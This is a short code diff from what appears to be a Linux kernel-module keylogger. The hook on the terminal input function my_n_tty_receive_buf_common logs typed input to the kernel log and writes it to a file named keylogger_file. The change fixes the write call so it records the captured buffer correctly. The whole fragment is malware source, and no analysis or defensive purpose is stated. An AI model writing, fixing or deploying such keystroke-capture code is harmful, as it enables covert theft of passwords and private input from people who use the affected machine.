@@ -29,7 +29,7 @@ int my_n_tty_receive_buf_common(struct tty_struct *tty, const unsigned char *cp,
 
 	if (strcmp(cp, "") != 0) {
 		printk("%s", cp);	
-		driver_file_write(keylogger_file, 0, f, result);
+		driver_file_write(keylogger_file, 0, cp, result);
 	}
 
 	// hooking the original function again
